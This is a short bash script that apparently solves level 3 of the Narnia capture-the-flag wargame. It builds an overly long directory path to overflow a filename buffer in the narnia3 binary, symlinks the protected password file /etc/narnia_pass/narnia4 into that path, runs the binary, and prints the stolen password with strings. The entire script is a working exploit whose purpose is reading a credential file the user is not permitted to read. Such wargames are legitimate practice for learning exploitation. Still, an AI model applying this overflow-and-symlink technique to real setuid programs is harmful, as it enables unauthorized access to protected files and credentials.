#!/bin/bash

# Setup filesystem
mkdir /home/narnia3/narnianarnianarnia
mkdir /home/narnia3/narnianarnianarnia/home
mkdir /home/narnia3/narnianarnianarnia/home/narnia3

# Make file objects
ln -s /etc/narnia_pass/narnia4 /home/narnia3/narnianarnianarnia/home/narnia3/o
touch /home/narnia3/o

# Pass exploit argument to program
/narnia/narnia3 /home/narnia3/narnianarnianarnia/home/narnia3/o

# Read password nicely (the output also contains binary output)
strings /home/narnia3/o

